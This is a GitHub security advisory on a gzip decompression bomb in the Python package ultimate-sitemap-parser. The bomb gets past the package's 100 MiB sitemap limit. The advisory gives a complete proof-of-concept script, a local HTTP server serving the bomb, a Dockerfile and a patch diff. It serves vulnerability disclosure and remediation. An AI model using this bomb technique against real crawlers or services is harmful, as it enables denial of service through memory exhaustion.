# [H] Ultimate Sitemap Parser (USP): Gzip Decompression Bomb Bypasses Sitemap Size Limit

## Summary
Severity: High
Advisory: GHSA-8823-qg2x-pv9f
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-8823-qg2x-pv9f
Type: github-advisory

## Affected
- PyPI: `ultimate-sitemap-parser` — affected >=0 <1.8.1

## Details
## Gzip Decompression Bomb Bypasses Sitemap Size Limit

### Summary

`ultimate-sitemap-parser` enforces a 100 MiB size limit on sitemap responses, but applies it only to the **compressed** bytes received over the network. When a `.gz` sitemap is fetched, `usp/helpers.py:239` calls `gzip_lib.decompress(data)` with no output-size cap, allowing an attacker-controlled server to serve a small gzip-compressed payload (~549 KB) that expands to over 120 MiB in process memory. This completely bypasses the declared limit and can exhaust memory or crash any process that calls `sitemap_tree_for_homepage()` against an untrusted site.

### Details

The library declares a maximum sitemap size constant in `usp/fetch_parse.py:64`:

```python
__MAX_SITEMAP_SIZE = 100 * 1024 * 1024  # Max. uncompressed sitemap size
```

Despite the comment saying "uncompressed", this value is passed directly to the HTTP client layer at `usp/fetch_parse.py:130`:

```python
web_client.set_max_response_data_length(self.__MAX_SITEMAP_SIZE)
```

The HTTP client (`usp/web_client/requests_client.py:57-58`) slices only the raw compressed response bytes:

```python
data = self.__requests_response.content[: self.__max_response_data_length]
```

The truncated (but still compressed) bytes are then passed through the pipeline to `usp/fetch_parse.py:175`:

```python
response_content = ungzipped_response_content(url=self._url, response=response)
```

Inside `ungzipped_response_content` (`usp/helpers.py:265-267`), when the URL ends in `.gz` or the response carries a gzip content type, decompression is triggered:

```python
if __response_is_gzipped_data(url=url, response=response):
    data = gunzip(data)
```

The `gunzip` function (`usp/helpers.py:239`) decompresses without any output-size guard:

```python
gunzipped_data = gzip_lib.decompress(data)
```

No post-decompression size check exists anywhere in the call chain. Dynamic reproduction confirmed that 549,213 bytes of compressed input passed the 100 MiB gate check (`compressed < limit → True`) and then expanded to 125,829,234 bytes (120.0 MiB) in memory with no exception raised.

### PoC

**Environment setup:**

```bash
# Clone the repository at the affected commit
git clone https://github.com/GateNLP/ultimate-sitemap-parser /tmp/usp-repo
cd /tmp/usp-repo
git checkout 182f4642f145230b68e7518e627883edd09168ca

# Build and run via Docker (memory-limited to 512 MiB)
docker build -t usp-vuln-002 -f vuln-002/Dockerfile /path/to/report-dir/
docker run --rm --memory=512m usp-vuln-002
```

**Alternatively, run directly:**

```bash
python -m venv /tmp/usp-poc
. /tmp/usp-poc/bin/activate
pip install ultimate-sitemap-parser==1.8.0
python3 poc.py
```

**PoC script (`poc.py`) — abbreviated attack flow:**

```python
import gzip, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from usp.tree import sitemap_tree_for_homepage

# Build a gzip bomb: 120 MB uncompressed, ~549 KB compressed
bomb_xml = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'
    b'<!--' + b'B' * (120 * 1024 * 1024) + b'-->'
    b'</urlset>'
)
compressed_bomb = gzip.compress(bomb_xml, compresslevel=1)

class BombHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        port = self.server.server_address[1]
        if self.path == "/robots.txt":
            body = f"Sitemap: http://127.0.0.1:{port}/sitemap.xml.gz\n".encode()
            self.send_response(200); self.end_headers(); self.wfile.write(body)
        elif self.path == "/sitemap.xml.gz":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-gzip")
            self.end_headers(); self.wfile.write(compressed_bomb)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

server = HTTPServer(("127.0.0.1", 0), BombHandler)
port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()

sitemap_tree_for_homepage(f"http://127.0.0.1:{port}/", use_known_paths=False)
server.shutdown()
```

**Expected output:**

```
[INTERCEPT] gunzip() input=549,213 B  output=125,829,234 B (120.0 MB)
[+] sitemap_tree_for_homepage() returned without exception
compressed=549,213 B < limit=104,857,600 B (passes gate)
decompressed=125,829,234 B > limit=104,857,600 B (no post-decompress check)
EXCEEDS LIMIT: True
[PASS] Decompression bomb bypassed the size limit.
```

The parser fetches `/sitemap.xml.gz`, passes the compressed-size gate check, decompresses 549 KB into 120 MiB in process memory, and returns normally without raising an exception.

**Remediation:**

```diff
--- a/usp/helpers.py
+++ b/usp/helpers.py
+import io
 
-def gunzip(data: bytes) -> bytes:
+def gunzip(data: bytes, max_output_bytes: int | None = None) -> bytes:
     try:
-        gunzipped_data = gzip_lib.decompress(data)
+        chunks, total = [], 0
+        with gzip_lib.GzipFile(fileobj=io.BytesIO(data)) as gz:
+            while chunk := gz.read(1024 * 1024):
+                total += len(chunk)
+                if max_output_bytes is not None and total > max_output_bytes:
+                    raise GunzipException(
+                        f"Gunzipped data exceeds maximum size of {max_output_bytes} bytes."
+                    )
+                chunks.append(chunk)
+        gunzipped_data = b"".join(chunks)

-def ungzipped_response_content(url, response):
+def ungzipped_response_content(url, response, max_uncompressed_size=None):
-            data = gunzip(data)
+            data = gunzip(data, max_output_bytes=max_uncompressed_size)

--- a/usp/fetch_parse.py
-        response_content = ungzipped_response_content(url=self._url, response=response)
+        response_content = ungzipped_response_content(
+            url=self._url, response=response,
+            max_uncompressed_size=self.__MAX_SITEMAP_SIZE,
+        )
```

### Impact

Any application that calls `sitemap_tree_for_homepage()` (or the underlying fetch/parse pipeline) against an attacker-controlled or compromised domain is vulnerable. The attacker only needs to control a web server that serves a valid `robots.txt` pointing to a gzip-compressed sitemap URL. No authentication or special configuration is required; the vulnerability is triggered by default library behavior.

A ~549 KB compressed payload expands to 120 MiB in process memory. Larger bombs are possible up to the compressed-size limit (100 MiB of compressed data could expand to tens of gigabytes). Repeated requests or sufficiently large bombs can cause out-of-memory crashes, service disruptions, or denial of service in any process or service that performs sitemap crawling.

This vulnerability is a **Denial of Service via Uncontrolled Resource Consumption (Decompression Bomb / Zip Bomb)**. Affected parties include:

- SEO tooling, search engine crawlers, and indexing services using this library.
- Web frameworks and microservices that expose a sitemap-crawling endpoint to external input.
- Any automated pipeline that regularly crawls third-party sitemaps.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

# Install build dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the vulnerable library from the cloned repo (build context: parent dir)
COPY repo/ /app/repo/

# Install the library from local source (version 1.8.0)
RUN pip install --no-cache-dir /app/repo/

# Copy the PoC script
COPY vuln-002/poc.py /app/poc.py

# Run with unbuffered output so evidence appears immediately
CMD ["python3", "-u", "/app/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof-of-Concept for VULN-002:
Gzip Decompression Bomb Bypasses Sitemap Size Limit
GateNLP/ultimate-sitemap-parser 1.8.0

Vulnerability location: usp/helpers.py:239
  gunzipped_data = gzip_lib.decompress(data)   # no max_length

Attack path:
  1. Attacker serves /robots.txt pointing to /sitemap.xml.gz
  2. Library enforces MAX_SITEMAP_SIZE (100 MB) on *compressed* response bytes
  3. Library calls gunzip() with no output-size limit
  4. Small compressed payload expands to >>100 MB in process memory

Expected outcome: gunzip() output size > 100 MB with no exception raised.
"""

import gzip
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Mirrors usp/fetch_parse.py:64 — the library's declared maximum
MAX_SITEMAP_SIZE = 100 * 1024 * 1024  # 100 MB

# Bomb decompresses to this size (deliberately exceeds the limit)
BOMB_UNCOMPRESSED_MB = 120
BOMB_UNCOMPRESSED_BYTES = BOMB_UNCOMPRESSED_MB * 1024 * 1024


def get_rss_mb() -> float:
    """Read current RSS from /proc/self/status in MB."""
    try:
        with open("/proc/self/status") as fh:
            for line in fh:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024
    except OSError:
        pass
    return 0.0


# ---------------------------------------------------------------------------
# Step 1 — Build the gzip bomb
# ---------------------------------------------------------------------------
print("[*] Building gzip bomb (compresslevel=1, fast) ...")
bomb_xml = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'
    b'<!--' + b'B' * BOMB_UNCOMPRESSED_BYTES + b'-->'
    b'</urlset>'
)
compressed_bomb = gzip.compress(bomb_xml, compresslevel=1)

print(f"[+] Uncompressed payload : {len(bomb_xml):>12,} bytes  ({len(bomb_xml)/1024/1024:.1f} MB)")
print(f"[+] Compressed bomb      : {len(compressed_bomb):>12,} bytes  ({len(compressed_bomb)/1024/1024:.3f} MB)")
print(f"[+] Library MAX_SITEMAP_SIZE : {MAX_SITEMAP_SIZE:,} bytes (100.0 MB)")
print(f"[+] compressed < limit   : {len(compressed_bomb) < MAX_SITEMAP_SIZE}  "
      f"(bomb passes the size gate)")
print(f"[+] uncompressed > limit : {len(bomb_xml) > MAX_SITEMAP_SIZE}  "
      f"(decompression would exceed intent)")
print()

# ---------------------------------------------------------------------------
# Step 2 — Serve the bomb via a local HTTP server
# ---------------------------------------------------------------------------
class BombHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        port = self.server.server_address[1]
        if self.path == "/robots.txt":
            body = (
                f"User-agent: *\n"
                f"Sitemap: http://127.0.0.1:{port}/sitemap.xml.gz\n"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif self.path == "/sitemap.xml.gz":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-gzip")
            self.send_header("Content-Length", str(len(compressed_bomb)))
            self.end_headers()
            self.wfile.write(compressed_bomb)

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt: str, *args: object) -> None:  # silence default log
        print(f"    [HTTP] {self.path}  {fmt % args}")


server = HTTPServer(("127.0.0.1", 0), BombHandler)
port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()
print(f"[*] Bomb server listening on http://127.0.0.1:{port}/")

# ---------------------------------------------------------------------------
# Step 3 — Monkeypatch usp.helpers.gunzip to intercept decompressed size
# ---------------------------------------------------------------------------
import usp.helpers as _helpers

_orig_gunzip = _helpers.gunzip
_intercepted: list[int] = []


def _patched_gunzip(data: bytes) -> bytes:
    result = _orig_gunzip(data)
    _intercepted.append(len(result))
    print(f"    [INTERCEPT] gunzip() input={len(data):,} B  output={len(result):,} B "
          f"({len(result)/1024/1024:.1f} MB)")
    return result


_helpers.gunzip = _patched_gunzip

# ---------------------------------------------------------------------------
# Step 4 — Trigger the vulnerability
# ---------------------------------------------------------------------------
from usp.tree import sitemap_tree_for_homepage

rss_before = get_rss_mb()
print(f"[*] RSS before parse: {rss_before:.1f} MB")
print(f"[*] Calling sitemap_tree_for_homepage(http://127.0.0.1:{port}/) ...")

try:
    _tree = sitemap_tree_for_homepage(
        f"http://127.0.0.1:{port}/",
        use_known_paths=False,
    )
    parse_raised = False
    print("[+] sitemap_tree_for_homepage() returned without exception")
except Exception as exc:
    parse_raised = True
    print(f"[!] sitemap_tree_for_homepage() raised: {exc}")

rss_after = get_rss_mb()
print(f"[*] RSS after  parse: {rss_after:.1f} MB  (delta: +{rss_after - rss_before:.1f} MB)")

server.shutdown()

# ---------------------------------------------------------------------------
# Step 5 — Evaluate and report
# ---------------------------------------------------------------------------
print()
print("=" * 60)
print("EXPLOIT RESULT SUMMARY")
print("=" * 60)

passed = False
reason = "no gunzip intercept captured"

if _intercepted:
    max_decompressed = max(_intercepted)
    print(f"  gunzip() call(s)     : {len(_intercepted)}")
    print(f"  max decompressed     : {max_decompressed:,} bytes ({max_decompressed/1024/1024:.1f} MB)")
    print(f"  library limit        : {MAX_SITEMAP_SIZE:,} bytes (100.0 MB)")
    print(f"  EXCEEDS LIMIT        : {max_decompressed > MAX_SITEMAP_SIZE}")

    if max_decompressed > MAX_SITEMAP_SIZE:
        passed = True
        reason = (
            f"gunzip() decompressed {max_decompressed:,} bytes "
            f"({max_decompressed/1024/1024:.1f} MB), exceeding the "
            f"{MAX_SITEMAP_SIZE/1024/1024:.0f} MB limit without raising an exception"
        )
        print()
        print("  [PASS] Decompression bomb bypassed the size limit.")
        print(f"  compressed={len(compressed_bomb):,} B < limit={MAX_SITEMAP_SIZE:,} B "
              f"(passes gate)")
        print(f"  decompressed={max_decompressed:,} B > limit={MAX_SITEMAP_SIZE:,} B "
              f"(no post-decompress check)")
    else:
        reason = (
            f"gunzip() decompressed {max_decompressed:,} bytes but did not exceed "
            f"{MAX_SITEMAP_SIZE:,} bytes limit"
        )
        print()
        print("  [FAIL] Decompressed size did not exceed limit.")
else:
    print("  [FAIL] gunzip() was not intercepted — sitemap path not reached.")

print("=" * 60)
sys.exit(0 if passed else 1)
```

## References
- https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-8823-qg2x-pv9f
- https://github.com/GateNLP/ultimate-sitemap-parser
